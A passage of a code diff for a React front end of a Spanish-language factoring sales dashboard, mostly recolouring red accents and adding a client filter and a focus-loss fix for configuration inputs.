         <DashCard Icon={Target} col="#0891b2" tag="SOW Prime" valor={<>{sowPrime}% <span className="t10 font-normal" style={{ color: C.faint }}>/ {m.targetProm}%</span></>} label="SOW deudores prime" meta={{ pct: pct(m.sowPrimeReal, m.targetProm) }} serie={dashSerie(m.sowPrimeReal, "meta-sowp-" + usuario)} />
-        <DashCard Icon={Target} col="#DC2626" tag="SOW Competencia" valor={<>{Math.round(m.compTargetReal)}% <span className="t10 font-normal" style={{ color: C.faint }}>/ ≤ {m.compTargetMeta}%</span></>} label="SOW factoring target" sub="Cartera prime" meta={{ invert: true, real: m.compTargetReal, objetivo: m.compTargetMeta }} serie={dashSerie(m.compTargetReal, "meta-comp-" + usuario)} />
+        <DashCard Icon={Target} col="#EF4444" tag="SOW Competencia" valor={<>{Math.round(m.compTargetReal)}% <span className="t10 font-normal" style={{ color: C.faint }}>/ ≤ {m.compTargetMeta}%</span></>} label="SOW factoring target" sub="Cartera prime" meta={{ invert: true, real: m.compTargetReal, objetivo: m.compTargetMeta }} serie={dashSerie(m.compTargetReal, "meta-comp-" + usuario)} />
       </Section>
     </div>
   );
@@ -10700,7 +12780,7 @@ function ReportePerformance({ usuario, inline, onClose }) {
         <KpiStat Icon={Check} col="#0891b2" v={<>{fmtMMc(kpi.facturado)} <span className="t10 font-normal" style={{ color: C.faint }}>emitido</span></>} l="Facturas de buenos deudores" s={`por ${fmtMMc(kpi.facturadoBuenas)} · ${kpi.facturadoBuenasPct}%`} />
         <KpiStat Icon={BarChart2} col="#7C3AED" v={fmtMMc(kpi.emitido)} l="Total Cedido" s={`${fmtMMc(kpi.buenasMM)} de buenos deudores`} />
         <KpiStat Icon={Check} col="#16A34A" v={fmtMMc(kpi.ganado)} l="Ganado (Security)" s={`SOW ${Math.round(kpi.sowPct)}%`} />
-        <KpiStat Icon={ArrowDownRight} col="#DC2626" v={fmtMMc(kpi.perdido)} l="Perdido" s={`${fmtMMc(kpi.perdBanco)} a factoring target (BCI/Chile/Itaú) · ${fmtMMc(kpi.perdOtros)} otros`} />
+        <KpiStat Icon={ArrowDownRight} col="#EF4444" v={fmtMMc(kpi.perdido)} l="Perdido" s={`${fmtMMc(kpi.perdBanco)} a factoring target (BCI/Chile/Itaú) · ${fmtMMc(kpi.perdOtros)} otros`} />
         <KpiStat Icon={BarChart2} col="#2563EB" v={`${Math.round(kpi.sowPct)}%`} l="SOW Target Deudores Prime" s={`${fmtMMc(kpi.ganado)} de ${fmtMMc(kpi.emitido)} cedido`} />
       </div>
       {/* Tabla drill-down (Resumen) */}
@@ -10709,7 +12789,7 @@ function ReportePerformance({ usuario, inline, onClose }) {
             <thead>
               <tr>
                 <th colSpan={6} />
-                <th colSpan={3} className="px-2 pb-1 text-center t10 font-bold uppercase tracking-wide" style={{ color: "#DC2626", borderBottom: `1px solid ${C.line}`, borderLeft: `1px solid ${C.line}` }}>Perdido</th>
+                <th colSpan={3} className="px-2 pb-1 text-center t10 font-bold uppercase tracking-wide" style={{ color: "#EF4444", borderBottom: `1px solid ${C.line}`, borderLeft: `1px solid ${C.line}` }}>Perdido</th>
               </tr>
               <tr>{[nivel, "Operac.", "Total Cedido", "Ganado", "SOW", "Tend. 4 sem", "Total", "Deudores Prime", "Factoring Target"].map((h, i) => (
                 <th key={h} className={`px-2 py-2 font-semibold ${i === 0 ? "text-left" : "text-right"}`} style={{ color: C.sub, borderBottom: `1px solid ${C.line}`, borderLeft: i === 6 ? `1px solid ${C.line}` : undefined }}>{h}</th>))}</tr>
@@ -10721,16 +12801,16 @@ function ReportePerformance({ usuario, inline, onClose }) {
                     <div className="flex flex-wrap items-center gap-1.5">
                       <span className="inline-flex items-center gap-1.5 font-medium" style={{ color: f.drill ? C.indigo : C.ink }}>{f.drill && <ChevronRight size={12} />}{f.label}</span>
                       {path.length === 2 && f.empresa && <span className="rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: f.empresa.activo ? "#F0FDF4" : "#F3F4F6", color: f.empresa.activo ? "#16A34A" : C.faint }}>{f.empresa.activo ? "Activo" : "Inactivo"}</span>}
-                      {path.length === 2 && f.perdBanco > 0 && <span onClick={(e) => e.stopPropagation()}><TipDesglose titulo="Alerta comercial" color="#DC2626" nota={`Esta empresa cede facturas al factoring target (BCI · Banco de Chile · Itaú). Negocio recuperable ${fmtMMc(f.perdBanco)}. Detalle por factoring:`} items={desgloseItems(f.cs, "factTarget", f.perdBanco)}><span className="inline-flex items-center gap-0.5 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: "#fef2f2", color: "#DC2626", border: "1px solid #fecaca" }}><AlertTriangle size={9} /> Alerta comercial</span></TipDesglose></span>}
+                      {path.length === 2 && f.perdBanco > 0 && <span onClick={(e) => e.stopPropagation()}><TipDesglose titulo="Alerta comercial" color="#EF4444" nota={`Esta empresa cede facturas al factoring target (BCI · Banco de Chile · Itaú). Negocio recuperable ${fmtMMc(f.perdBanco)}. Detalle por factoring:`} items={desgloseItems(f.cs, "factTarget", f.perdBanco)}><span className="inline-flex items-center gap-0.5 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: "#fef2f2", color: "#EF4444", border: "1px solid #fecaca" }}><AlertTriangle size={9} /> Alerta comercial</span></TipDesglose></span>}
                     </div>
                     {f.drill && <div className="t9" style={{ color: C.faint }}>{f.emitieron}/{f.n} clientes activos</div>}
                   </td>
                   <td className="px-2 py-2 text-right" style={{ color: C.sub }}>{f.ops}</td>
                   <td className="px-2 py-2 text-right font-medium" style={{ color: C.ink }}>{fmtMMc(f.emitido)}</td>
                   <td className="px-2 py-2 text-right font-medium" style={{ color: "#16A34A" }}>{fmtMMc(f.ganado)}</td>
-                  <td className="px-2 py-2 text-right font-semibold" style={{ color: f.sowPct >= 60 ? "#16A34A" : f.sowPct >= 35 ? "#C2410C" : "#DC2626" }}>{Math.round(f.sowPct)}%</td>
+                  <td className="px-2 py-2 text-right font-semibold" style={{ color: f.sowPct >= 60 ? "#16A34A" : f.sowPct >= 35 ? "#C2410C" : "#EF4444" }}>{Math.round(f.sowPct)}%</td>
                   <td className="px-2 py-2">{(() => {
-                    const tr = tendSow4(f.cs); const up = tr.delta >= 0; const col = up ? "#16A34A" : "#DC2626";
+                    const tr = tendSow4(f.cs); const up = tr.delta >= 0; const col = up ? "#16A34A" : "#EF4444";
                     const pts = tr.pts.length ? tr.pts : [0]; const n = pts.length;
                     const W = 56, H = 20, pad = 3; const mn = Math.min(...pts), mx = Math.max(...pts), rng = (mx - mn) || 1;
                     const X = (i) => n <= 1 ? W / 2 : 1 + (i / (n - 1)) * (W - 2);
@@ -10750,8 +12830,8 @@ function ReportePerformance({ usuario, inline, onClose }) {
                   <td className="px-2 py-2 text-right" style={{ color: C.sub }}>
                     <TipDesglose titulo="Perdido por deudor prime" nota="Deudor · factoring con que se perdió" color="#0891b2" items={desgloseDeudorPrime(f.cs, f.perdidoPrime, 12)}>{fmtMMc(f.perdidoPrime)}<span className="t8" style={{ color: C.faint }}>ⓘ</span></TipDesglose>
                   </td>
-                  <td className="px-2 py-2 text-right font-medium" style={{ color: f.perdBanco > 0 ? "#DC2626" : C.faint }}>
-                    <TipDesglose titulo="Perdido por factoring target" color="#DC2626" items={desgloseItems(f.cs, "factTarget", f.perdBanco)}>{fmtMMc(f.perdBanco)}<span className="t8" style={{ color: f.perdBanco > 0 ? "#DC2626" : C.faint }}>ⓘ</span></TipDesglose>
+                  <td className="px-2 py-2 text-right font-medium" style={{ color: f.perdBanco > 0 ? "#EF4444" : C.faint }}>
+                    <TipDesglose titulo="Perdido por factoring target" color="#EF4444" items={desgloseItems(f.cs, "factTarget", f.perdBanco)}>{fmtMMc(f.perdBanco)}<span className="t8" style={{ color: f.perdBanco > 0 ? "#EF4444" : C.faint }}>ⓘ</span></TipDesglose>
                   </td>
                 </tr>
               ))}
@@ -10763,7 +12843,7 @@ function ReportePerformance({ usuario, inline, onClose }) {
       <div className="mt-5 border-t pt-4" style={{ borderColor: C.line }}>
           <div className="flex items-center gap-2 t11">
             <span className="font-semibold" style={{ color: C.ink }}>Evolución del SOW · últimas 4 semanas al {fmtFecha(hasta)}</span>
-            <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: delta >= 0 ? "#F0FDF4" : "#fef2f2", color: delta >= 0 ? "#16A34A" : "#DC2626" }}>{delta >= 0 ? <ArrowUpRight size={11} /> : <ArrowDownRight size={11} />} {delta >= 0 ? "+" : ""}{delta} pts</span>
+            <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: delta >= 0 ? "#F0FDF4" : "#fef2f2", color: delta >= 0 ? "#16A34A" : "#EF4444" }}>{delta >= 0 ? <ArrowUpRight size={11} /> : <ArrowDownRight size={11} />} {delta >= 0 ? "+" : ""}{delta} pts</span>
             <span className="t9" style={{ color: C.faint }}>{delta >= 0 ? "estamos ganando participación" : "estamos perdiendo participación"} en las últimas 4 semanas</span>
           </div>
           <div className="mt-2 overflow-x-auto">
@@ -10777,9 +12857,9 @@ function ReportePerformance({ usuario, inline, onClose }) {
                     <td className="px-2 py-1.5 text-right" style={{ color: C.sub }}>{fmtMMc(w.emitido)}</td>
                     <td className="px-2 py-1.5 text-right" style={{ color: "#0891b2" }}>{fmtMMc(w.buenas)}</td>
                     <td className="px-2 py-1.5 text-right font-medium" style={{ color: "#16A34A" }}>{fmtMMc(w.ganado)}</td>
-                    <td className="px-2 py-1.5 text-right" style={{ color: w.perdBanco > 0 ? "#DC2626" : C.faint }}>{fmtMMc(w.perdBanco)}</td>
+                    <td className="px-2 py-1.5 text-right" style={{ color: w.perdBanco > 0 ? "#EF4444" : C.faint }}>{fmtMMc(w.perdBanco)}</td>
                     <td className="px-2 py-1.5 text-right" style={{ color: C.sub }}>{fmtMMc(w.perdOtros)}</td>
-                    <td className="px-2 py-1.5 text-right font-semibold" style={{ color: w.sowPct >= 60 ? "#16A34A" : w.sowPct >= 35 ? "#C2410C" : "#DC2626" }}>{Math.round(w.sowPct)}%</td>
+                    <td className="px-2 py-1.5 text-right font-semibold" style={{ color: w.sowPct >= 60 ? "#16A34A" : w.sowPct >= 35 ? "#C2410C" : "#EF4444" }}>{Math.round(w.sowPct)}%</td>
                   </tr>
                 ))}
               </tbody>
@@ -10808,7 +12888,7 @@ function PCcliente({ resumen, hayFiltro }) {
     { v: resumen.total.toLocaleString("es-CL"), l: "Clientes", s: "en el alcance", Icon: User, col: "#703EFF" },
     { v: resumen.sec.toLocaleString("es-CL"), l: "Operan con Security", s: "clientes activos", Icon: Check, col: "#16A34A" },
     { v: resumen.comp.toLocaleString("es-CL"), l: "Solo competencia", s: "wallet no capturado", Icon: ArrowUpRight, col: "#F97316" },
-    { v: resumen.inac.toLocaleString("es-CL"), l: "Inactivos / prospectos", s: "no operan con Security", Icon: Clock, col: "#ef4444" },
+    { v: resumen.inac.toLocaleString("es-CL"), l: "Inactivos / prospectos", s: "no operan con Security", Icon: Clock, col: "#EF4444" },
     { v: resumen.sowProm + "%", l: "SOW promedio", s: "share of wallet medio", Icon: BarChart2, col: "#2563EB" },
     { v: fmtMMc(resumen.brecha), l: "Brecha de wallet", s: "por capturar vs target", Icon: ArrowUpRight, col: "#F97316" },
   ];
@@ -10902,7 +12982,7 @@ function PCsow({ clientes = [] }) {
   const desviacion = [
     { l: "Defendidos · SoW ≥ target", v: sec.filter((c) => c.sow >= c.target).length, col: "#16A34A" },
     { l: "Brecha moderada · hasta 20 pp bajo target", v: sec.filter((c) => c.sow < c.target && c.target - c.sow <= 20).length, col: "#F97316" },
-    { l: "Brecha crítica · más de 20 pp bajo target", v: sec.filter((c) => c.target - c.sow > 20).length, col: "#ef4444" },
+    { l: "Brecha crítica · más de 20 pp bajo target", v: sec.filter((c) => c.target - c.sow > 20).length, col: "#EF4444" },
   ];
   const maxComp = Math.max(...PC_COMPETIDORES.map((c) => c.mm));
   const zonaCols = { Norte: "#703EFF", Centro: "#16A34A", Sur: "#F97316" };
@@ -10965,7 +13045,7 @@ function PCdesempeno({ execs }) {
             <div className="mt-3 space-y-1.5 t11">
               <div className="flex items-center justify-between"><span style={{ color: C.sub }}>Clientes</span><b style={{ color: C.ink }}>{e.clientes}</b></div>
               <div className="flex items-center justify-between"><span style={{ color: C.sub }}>Activos Security</span><b style={{ color: C.ink }}>{e.activos}</b></div>
-              <div className="flex items-center justify-between"><span style={{ color: C.sub }}>En fuga</span><b style={{ color: "#ef4444" }}>{e.fuga}</b></div>
+              <div className="flex items-center justify-between"><span style={{ color: C.sub }}>En fuga</span><b style={{ color: "#EF4444" }}>{e.fuga}</b></div>
               <div className="flex items-center justify-between"><span style={{ color: C.sub }}>Brecha wallet</span><b style={{ color: C.ink }}>{fmtMMc(e.brecha)}</b></div>
             </div>
           </div>
@@ -11145,25 +13225,35 @@ function productosSeed() {
   });
 }
 function productosDe(nombre) { productosSeed(); return PRODUCTOS_CLIENTE[nombre] || ["factoring"]; }
-function ClientesView({ soloExec }) {
+function ClientesView({ soloExec, sel }) {
   const [q, setQ] = useState("");
-  const [fEstado, setFEstado] = useState("todos");
+  const [fEstado, setFEstado] = useState((sel && sel.f) || "todos");
   const [editar, setEditar] = useState(null); // empresa a editar, o { nuevo:true }, o null (listado)
   const [histCli, setHistCli] = useState(null); // empresa cuyo historial de búsqueda se muestra
   const [confirmElim, setConfirmElim] = useState(null); // empresa a eliminar (ConfirmDialog §26 — nunca borrar a un clic)
   const [bajas, setBajas] = useState(() => new Set()); // empIds dados de baja en la sesión (demo: baja local)
+  // Selección que llega desde las cards de «Empresas» del Dashboard. El shell manda un objeto NUEVO en
+  // cada clic, así que volver a pinchar la misma card reaplica el filtro aunque el usuario lo haya
+  // cambiado a mano en el intertanto.
+  useEffect(() => { if (sel && sel.f) { setFEstado(sel.f); setEditar(null); } }, [sel]);
   if (editar) return <EmpresaEditor empresa={editar} soloExec={soloExec} onBack={() => setEditar(null)} />;
   const base = soloExec ? PC_EMPRESAS.filter((e) => e.ej === soloExec) : PC_EMPRESAS;
+  // «competencia» = las que ceden a otros factorings (card «Operan con otros» del Dashboard).
+  const pasaEstado = (e) => fEstado === "todos" ? true
+    : fEstado === "activa" ? e.activa
+    : fEstado === "inactiva" ? !e.activa
+    : fEstado === "competencia" ? e.estado === "Competencia"
+    : true;
   const rows = base.filter((e) =>
     !bajas.has(e.empId) &&
-    (fEstado === "todos" || (fEstado === "activa" ? e.activa : !e.activa)) &&
+    pasaEstado(e) &&
     (!q || e.nombre.toLowerCase().includes(q.toLowerCase()) || e.rut.includes(q) || String(e.empId).includes(q) || e.ej.toLowerCase().includes(q.toLowerCase()))
   ).sort((a, b) => b.fechaSort - a.fechaSort);
   const nActivas = base.filter((e) => e.activa).length;
   const nUsuarios = base.reduce((s, e) => s + e.usuarios, 0);
   const cols = ["Id", "Empresa", "Registro", "Estado", "Búsqueda", "Productos", "Usuarios", "Ejecutivo", "Acciones"];
   const AccBtn = ({ Icon, color, onClick, title }) => (
-    <button onClick={onClick} title={title} className="flex h-8 w-8 items-center justify-center rounded-lg hover:bg-stone-50" style={{ border: `1px solid ${color === "#dc2626" ? "#fecaca" : C.line}`, color: color || C.sub, backgroundColor: "#fff" }}><Icon size={14} /></button>
+    <button onClick={onClick} title={title} className="flex h-8 w-8 items-center justify-center rounded-lg hover:bg-stone-50" style={{ border: `1px solid ${color === "#EF4444" ? "#fecaca" : C.line}`, color: color || C.sub, backgroundColor: "#fff" }}><Icon size={14} /></button>
   );
   return (
     <div className="space-y-4">
@@ -11180,7 +13270,7 @@ function ClientesView({ soloExec }) {
             <Search size={13} style={{ color: C.faint }} />
             <input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Buscar por empresa, RUT, Id o ejecutivo…" className="w-64 bg-transparent t12 outline-none" style={{ color: C.ink }} />
           </div>
-          {[["todos", "Todas"], ["activa", "Activas"], ["inactiva", "Inactivas"]].map(([k, l]) => (
+          {[["todos", "Todas"], ["activa", "Activas"], ["inactiva", "Inactivas"], ["competencia", "Operan con otros"]].map(([k, l]) => (
             <button key={k} onClick={() => setFEstado(k)} className="rounded-lg px-3 py-1.5 t12 font-medium" style={{ border: `1px solid ${fEstado === k ? C.indigo : C.line}`, backgroundColor: fEstado === k ? C.indigo : "#fff", color: fEstado === k ? "#fff" : C.ink }}>{l}</button>
           ))}
         </div>
@@ -11205,7 +13295,7 @@ function ClientesView({ soloExec }) {
                 <td className="px-3 py-3"><div className="flex flex-wrap gap-1" style={{ maxWidth: 240 }}>{productosDe(e.nombre).map((pid) => { const p = PRODUCTOS_CAT.find((x) => x.id === pid); return p ? <span key={pid} className="rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: p.bg, color: p.color }}>{p.nombre}</span> : null; })}</div></td>
                 <td className="px-3 py-3 t12" style={{ color: C.sub }}>{e.usuarios}</td>
                 <td className="whitespace-nowrap px-3 py-3 t12" style={{ color: C.sub }}>{e.ej}</td>
-                <td className="px-3 py-3"><div className="flex items-center justify-end gap-1.5"><AccBtn Icon={Search} title="Ver" onClick={() => setEditar(e)} /><AccBtn Icon={Pencil} title="Editar" onClick={() => setEditar(e)} /><AccBtn Icon={Trash2} color="#dc2626" title="Eliminar" onClick={() => setConfirmElim(e)} /></div></td>
+                <td className="px-3 py-3"><div className="flex items-center justify-end gap-1.5"><AccBtn Icon={Search} title="Ver" onClick={() => setEditar(e)} /><AccBtn Icon={Pencil} title="Editar" onClick={() => setEditar(e)} /><AccBtn Icon={Trash2} color="#EF4444" title="Eliminar" onClick={() => setConfirmElim(e)} /></div></td>
               </tr>
             ))}
             {rows.length === 0 && <tr><td colSpan={cols.length} className="px-3 py-8 text-center t11" style={{ color: C.faint }}>Sin empresas para el filtro.</td></tr>}
@@ -11570,7 +13660,7 @@ function EmpresaEditor({ empresa, soloExec, onBack }) {
                       </div>
                       <div className="mt-0.5 t11" style={{ color: C.sub }}>Tel: {u.telefono || "—"} · Email: {u.email || "—"}</div>
                     </div>
-                    {u.manual && <button onClick={() => setUsuariosNuevos((p) => p.filter((x) => x.id !== u.id))} title="Quitar" className="flex h-8 w-8 shrink-0 items-center justify-center rounded-lg" style={{ border: "1px solid #fecaca", color: "#dc2626", backgroundColor: "#fff" }}><Trash2 size={14} /></button>}
+                    {u.manual && <button onClick={() => setUsuariosNuevos((p) => p.filter((x) => x.id !== u.id))} title="Quitar" className="flex h-8 w-8 shrink-0 items-center justify-center rounded-lg" style={{ border: "1px solid #fecaca", color: "#EF4444", backgroundColor: "#fff" }}><Trash2 size={14} /></button>}
                   </div>
                 ))}
               </div>
@@ -11676,7 +13766,7 @@ function AuditoriaView({ usuario }) {
         {[
           { t: "Eventos", v: rows.length, s: "en el filtro actual", col: C.ink, bg: "#fff" },
           { t: "Exitosos", v: nOk, s: "acciones completadas", col: "#16A34A", bg: "#F0FDF4" },
-          { t: "Fallidos", v: rows.length - nOk, s: "con error o rechazo", col: "#dc2626", bg: "#fef2f2" },
+          { t: "Fallidos", v: rows.length - nOk, s: "con error o rechazo", col: "#EF4444", bg: "#fef2f2" },
           { t: "Usuarios", v: usuarios.length, s: "con actividad registrada", col: C.indigo, bg: "#fff" },
         ].map((k, i) => (
           <div key={i} className="rounded-xl p-3" style={{ backgroundColor: k.bg, border: `1px solid ${C.line}` }}>
@@ -11724,7 +13814,7 @@ function AuditoriaView({ usuario }) {
                 <td className="whitespace-nowrap px-3 py-2.5 t12" style={{ color: C.ink }}>{e.modulo}</td>
                 <td className="px-3 py-2.5"><div className="t12" style={{ color: C.ink }}>{e.glosa}</div><div className="t9" style={{ color: C.faint }}>{e.accion}</div></td>
                 <td className="whitespace-nowrap px-3 py-2.5 t11" style={{ color: C.sub }}>{e.empresaId || "—"}</td>
-                <td className="whitespace-nowrap px-3 py-2.5"><span className="rounded-full px-2 py-0.5 t10 font-semibold" style={{ backgroundColor: e.exito ? "#F0FDF4" : "#fef2f2", color: e.exito ? "#16A34A" : "#dc2626" }}>{e.exito ? "Sí" : "No"}</span></td>
+                <td className="whitespace-nowrap px-3 py-2.5"><span className="rounded-full px-2 py-0.5 t10 font-semibold" style={{ backgroundColor: e.exito ? "#F0FDF4" : "#fef2f2", color: e.exito ? "#16A34A" : "#EF4444" }}>{e.exito ? "Sí" : "No"}</span></td>
                 <td className="px-3 py-2.5 text-right"><button onClick={() => setDet(e)} className="ml-auto flex h-8 w-8 items-center justify-center rounded-lg hover:bg-stone-50" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}><Search size={14} /></button></td>
               </tr>
             ))}
@@ -11743,7 +13833,7 @@ function AuditoriaView({ usuario }) {
               {[["Usuario", det.usuario], ["Módulo", det.modulo], ["Acción", det.accion], ["Glosa", det.glosa], ["Id. empresa", det.empresaId || "—"], ["Fecha", det.fecha], ["Hora", det.hora], ["Resultado", det.exito ? "Éxito" : "Fallido"]].map(([l, v]) => (
                 <div key={l} className="flex justify-between gap-4">
                   <span className="t11 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>{l}</span>
-                  <span className="t13 text-right" style={{ color: l === "Resultado" ? (det.exito ? "#16A34A" : "#dc2626") : C.ink, fontWeight: 500 }}>{v}</span>
+                  <span className="t13 text-right" style={{ color: l === "Resultado" ? (det.exito ? "#16A34A" : "#EF4444") : C.ink, fontWeight: 500 }}>{v}</span>
                 </div>
               ))}
             </div>
@@ -11755,18 +13845,30 @@ function AuditoriaView({ usuario }) {
 }
 // Sección «Operación»: horarios, frecuencia de actualización y latencias — POR TENANT (factoring).
 // Estos parámetros dejan de estar hardcodeados: en producción se leen/escriben vía `tenant_config`.
-function CfgOperacion({ cfgOper, setCfgOper }) {
-  const [tenant, setTenant] = useState(TENANT_ACTUAL);
-  const cfg = (cfgOper && cfgOper[tenant]) || CFG_OPER_BASE;
-  const set = (k, v) => setCfgOper((prev) => ({ ...prev, [tenant]: { ...((prev && prev[tenant]) || CFG_OPER_BASE), [k]: v } }));
-  const t = TENANTS.find((x) => x.id === tenant) || TENANTS[0];
-  const Campo = ({ l, hint, children }) => (
+// Campo de configuracion. Vive FUERA de CfgOperacion: definido adentro, React lo trataba como un tipo
+// nuevo en cada render y remontaba el subarbol, de modo que los inputs numericos perdian el foco en
+// cada tecla. No cierra sobre nada del componente, asi que subirlo no cambia su comportamiento.
+// Etiqueta de los campos financieros del wizard de comité. A ámbito de módulo por lo mismo que
+// CfgCampo: definida dentro del render, React la trataba como un tipo nuevo en cada tecla y remontaba
+// el <label> junto con el <input> que envuelve, así que los 16 campos perdían el foco carácter a
+// carácter. No cierra sobre nada del componente.
+function Lb({ t, children }) {
+  return <label className="t9" style={{ color: C.sub }}>{t}{children}</label>;
+}
+function CfgCampo({ l, hint, children }) {
+  return (
     <div className="rounded-xl p-3" style={{ border: `1px solid ${C.line}` }}>
       <div className="t11 font-semibold" style={{ color: C.ink }}>{l}</div>
       {hint && <div className="mt-0.5 t9" style={{ color: C.faint, lineHeight: 1.4 }}>{hint}</div>}
       <div className="mt-2">{children}</div>
     </div>
   );
+}
+function CfgOperacion({ cfgOper, setCfgOper }) {
+  const [tenant, setTenant] = useState(TENANT_ACTUAL);
+  const cfg = (cfgOper && cfgOper[tenant]) || CFG_OPER_BASE;
+  const set = (k, v) => setCfgOper((prev) => ({ ...prev, [tenant]: { ...((prev && prev[tenant]) || CFG_OPER_BASE), [k]: v } }));
+  const t = TENANTS.find((x) => x.id === tenant) || TENANTS[0];
   const inp = { className: "w-full rounded-md px-2 py-1.5 t11 outline-none", style: { border: `1px solid ${C.line}`, color: C.ink, backgroundColor: "#fff" } };
   const num = (k, min, max, step) => ({ ...inp, type: "number", min, max, step: step || 1, value: cfg[k], onChange: (e) => set(k, +e.target.value || 0) });
   return (
@@ -11787,77 +13889,77 @@ function CfgOperacion({ cfgOper, setCfgOper }) {
         Tenant activo: <b>{t.nombre}</b> · RUT {t.rut}. Los parámetros de abajo aplican sólo a este factoring; otro tenant puede tener horarios y frecuencias distintos.
       </div>
       <div className="mt-3 grid gap-2.5 md:grid-cols-3">
-        <Campo l="Ventana horaria" hint="Horario en que la plataforma ingesta documentos y actualiza oportunidades.">
+        <CfgCampo l="Ventana horaria" hint="Horario en que la plataforma ingesta documentos y actualiza oportunidades.">
           <div className="flex items-center gap-2">
             <input type="time" value={cfg.horaInicio} onChange={(e) => set("horaInicio", e.target.value)} {...inp} />
             <span className="t10" style={{ color: C.faint }}>a</span>
             <input type="time" value={cfg.horaFin} onChange={(e) => set("horaFin", e.target.value)} {...inp} />
           </div>
-        </Campo>
-        <Campo l="Frecuencia de actualización" hint="Cada cuántos minutos se consulta el libro de ventas / API por facturas nuevas del cliente.">
+        </CfgCampo>
+        <CfgCampo l="Frecuencia de actualización" hint="Cada cuántos minutos se consulta el libro de ventas / API por facturas nuevas del cliente.">
           <div className="flex items-center gap-2"><input {...num("frecuenciaMin", 5, 720, 5)} /><span className="t10 whitespace-nowrap" style={{ color: C.faint }}>min</span></div>
-        </Campo>
-        <Campo l="Jornada" hint="Horas hábiles por día y días hábiles por semana.">
+        </CfgCampo>
+        <CfgCampo l="Jornada" hint="Horas hábiles por día y días hábiles por semana.">
           <div className="flex items-center gap-2"><input {...num("horasDia", 1, 24)} /><span className="t10" style={{ color: C.faint }}>h/día</span><input {...num("diasSemana", 1, 7)} /><span className="t10" style={{ color: C.faint }}>d/sem</span></div>
-        </Campo>
-        <Campo l="Tope de documentos por corrida" hint="Control de carga: máximo de documentos procesados en cada ejecución.">
+        </CfgCampo>
+        <CfgCampo l="Tope de documentos por corrida" hint="Control de carga: máximo de documentos procesados en cada ejecución.">
           <input {...num("topeDocsCorrida", 10, 5000, 10)} />
-        </Campo>
-        <Campo l="Lote de ingesta" hint="Tamaño de lote al leer documentos desde la fuente (paginación del backend).">
+        </CfgCampo>
+        <CfgCampo l="Lote de ingesta" hint="Tamaño de lote al leer documentos desde la fuente (paginación del backend).">
           <input {...num("loteStream", 25, 5000, 25)} />
-        </Campo>
-        <Campo l="Latencia de recálculo" hint="Tiempo simulado del proceso en background: base + incremento por documento. Anticipa operaciones con miles de facturas.">
+        </CfgCampo>
+        <CfgCampo l="Latencia de recálculo" hint="Tiempo simulado del proceso en background: base + incremento por documento. Anticipa operaciones con miles de facturas.">
           <div className="flex items-center gap-2"><input {...num("latenciaBaseMs", 0, 10000, 100)} /><span className="t10" style={{ color: C.faint }}>ms base</span><input {...num("latenciaPorDocMs", 0, 500, 5)} /><span className="t10 whitespace-nowrap" style={{ color: C.faint }}>ms/doc</span></div>
-        </Campo>
-        <Campo l="Velocidad del reloj (demo)" hint="Equivalencia de una «hora» de operación en la simulación. Sólo aplica a la demo.">
+        </CfgCampo>
+        <CfgCampo l="Velocidad del reloj (demo)" hint="Equivalencia de una «hora» de operación en la simulación. Sólo aplica a la demo.">
           <div className="flex items-center gap-2"><input {...num("cronMs", 500, 60000, 250)} /><span className="t10 whitespace-nowrap" style={{ color: C.faint }}>ms/hora</span></div>
-        </Campo>
-        <Campo l="Reapertura diaria" hint="Al cierre del día, las oportunidades no gestionadas se cierran y se reabren con el paquete de facturas vigente en la BD.">
+        </CfgCampo>
+        <CfgCampo l="Reapertura diaria" hint="Al cierre del día, las oportunidades no gestionadas se cierran y se reabren con el paquete de facturas vigente en la BD.">
           <label className="flex items-center gap-2 t11" style={{ color: C.ink }}>
             <input type="checkbox" checked={!!cfg.reaperturaDiaria} onChange={(e) => set("reaperturaDiaria", e.target.checked)} /> Activada
           </label>
-        </Campo>
-        <Campo l="Etapa «no gestionada»" hint="Etapa en la que una oportunidad se considera sin gestión al cierre del día. Cualquier edición la promueve a Oferta y Negociación.">
+        </CfgCampo>
+        <CfgCampo l="Etapa «no gestionada»" hint="Etapa en la que una oportunidad se considera sin gestión al cierre del día. Cualquier edición la promueve a Oferta y Negociación.">
           <select value={cfg.etapaNoGestionada} onChange={(e) => set("etapaNoGestionada", e.target.value)} className="w-full rounded-md px-2 py-1.5 t11" style={{ border: `1px solid ${C.line}`, color: C.ink, backgroundColor: "#fff" }}>
             {STAGES.filter((s) => ["prospeccion", "oferta"].includes(s.id)).map((s) => <option key={s.id} value={s.id}>{s.name}</option>)}
           </select>
-        </Campo>
+        </CfgCampo>
       </div>
       <div className="mt-5 text-lg font-semibold" style={{ color: C.ink }}>Simulación y pricing</div>
       <div className="mt-0.5 t12" style={{ color: C.faint }}>Cómo este factoring construye y valoriza una oferta: selección de la tasa, costo de fondo, piso económico, atribuciones de descuento y condiciones base.</div>
       <div className="mt-3 grid gap-2.5 md:grid-cols-3">
-        <Campo l="Selección de la tasa del negocio" hint="Regla con que se define la tasa efectiva de la simulación.">
+        <CfgCampo l="Selección de la tasa del negocio" hint="Regla con que se define la tasa efectiva de la simulación.">
           <select value={cfg.tasaModo} onChange={(e) => set("tasaModo", e.target.value)} className="w-full rounded-md px-2 py-1.5 t11" style={{ border: `1px solid ${C.line}`, color: C.ink, backgroundColor: "#fff" }}>
             <option value="riesgo">Ponderada por riesgo del deudor</option>
             <option value="ultima">Tasa del último negocio cursado</option>
             <option value="mayor">La mayor de ambas (no bajar de la última)</option>
           </select>
-        </Campo>
-        <Campo l="Costo de fondo" hint="% mensual que se suma al spread del deudor para formar la tasa.">
+        </CfgCampo>
+        <CfgCampo l="Costo de fondo" hint="% mensual que se suma al spread del deudor para formar la tasa.">
           <div className="flex items-center gap-2"><input {...num("costoFondo", 0, 10, 0.01)} /><span className="t10" style={{ color: C.faint }}>% mensual</span></div>
-        </Campo>
-        <Campo l="Piso económico / mínimo absoluto" hint="Bajo el piso la operación es inviable; bajo el mínimo absoluto no se autoriza nunca.">
+        </CfgCampo>
